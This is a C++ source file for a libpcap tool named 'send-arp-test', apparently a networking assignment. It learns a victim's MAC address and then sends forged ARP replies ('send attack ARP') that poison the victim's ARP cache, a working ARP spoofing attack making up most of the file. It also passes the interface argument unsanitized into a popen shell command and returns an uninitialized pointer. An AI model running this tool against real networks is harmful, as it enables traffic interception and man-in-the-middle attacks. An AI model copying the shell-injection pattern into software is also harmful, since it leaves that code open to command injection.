#include "pch.h"

#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};

#pragma pack(pop)

void usage() {
    printf("syntax: send-arp-test <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
    printf("sample: send-arp-test wlan0 192.168.10.2 192.168.10.1\n");
}

std::string getMacAddress(const std::string& interfaceName) {
    std::string command = "ifconfig " + interfaceName + " 2>/dev/null";
    FILE* pipe = popen(command.c_str(), "r");
    if (!pipe) {
        std::cerr << "Failed to run ifconfig." << std::endl;
        return "";
    }

    std::ostringstream output;
    char buffer[256];
    while (fgets(buffer, sizeof(buffer), pipe) != nullptr) {
        output << buffer;
    }
    pclose(pipe);

    std::string result = output.str();
    std::regex macRegex(R"(ether ([0-9a-fA-F:]{17}))");
    std::smatch match;
    if (std::regex_search(result, match, macRegex)) {
        return match[1].str();
    }

    return "";
}

std::string getIpAddress(const std::string& interfaceName) {
    std::string command = "ifconfig " + interfaceName + " 2>/dev/null";
    FILE* pipe = popen(command.c_str(), "r");
    if (!pipe) {
        std::cerr << "Failed to run ifconfig." << std::endl;
        return "";
    }

    std::ostringstream output;
    char buffer[256];
    while (fgets(buffer, sizeof(buffer), pipe) != nullptr) {
        output << buffer;
    }
    pclose(pipe);

    std::string result = output.str();
    std::regex ipRegex(R"(inet ([0-9]+\.[0-9]+\.[0-9]+\.[0-9]+))");
    std::smatch match;
    if (std::regex_search(result, match, ipRegex)) {
        return match[1].str();
    }

    return "";
}

ArpHdr* sendArp(pcap_t* pcap, Mac eth_dmac, Mac eth_smac, Ip sip, Ip dip, Mac arp_smac, Mac arp_dmac){
    EthArpPacket packet;

    packet.eth_.dmac_ = eth_dmac;
    packet.eth_.smac_ = eth_smac;
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;

    packet.arp_.op_ = htons(ArpHdr::Request);
    packet.arp_.smac_ = arp_smac;
    packet.arp_.sip_ = htonl(sip);
    packet.arp_.tmac_ = arp_dmac;
    packet.arp_.tip_ = htonl(dip);

    int res = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));
    }
    while(true){
        struct pcap_pkthdr* header;
        const u_char* reply_packet;
        int res = pcap_next_ex(pcap, &header, &reply_packet);
        if (res == 0) continue;
        if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK){
            printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(pcap));
            break;
        }
        EthHdr* ethHdr = (struct EthHdr*)reply_packet;
        if(ethHdr->type() != htons(EthHdr::Arp)) continue;

        ArpHdr* arpHdr = (struct ArpHdr*)(reply_packet + sizeof(struct EthHdr));
        if(arpHdr->sip() == Ip(dip) || arpHdr->op() == htons(ArpHdr::Reply)){
            return arpHdr;
        }
    }
    ArpHdr* arpHdr;
    return arpHdr;
}

int main(int argc, char* argv[]) {
    if (argc < 4) {
		usage();
		return EXIT_FAILURE;
	}

    char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];

    // get my MAC, IP address
    std::string sdev = argv[1];
    std::string my_mac = getMacAddress(sdev);
    std::string my_ip = getIpAddress(sdev);

    pcap_t* pcap = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
    if (pcap == nullptr) {
        fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
        return EXIT_FAILURE;
    }

    for(int i=2;i<argc;i+=2){
        std::string sip = argv[i];
        std::string tip = argv[i+1];

        // get victim's MAC address
        ArpHdr* arpHdr = sendArp(pcap, Mac(my_mac), Mac::broadcastMac(), Ip(my_ip), Ip(sip), Mac(my_mac), Mac::nullMac());
        Mac smac = arpHdr->smac();

        // send attack ARP
        sendArp(pcap, Mac(my_mac), Mac(smac), Ip(sip), Ip(tip), Mac(my_mac), Mac(smac));
    }
    pcap_close(pcap);

    return 0;
}
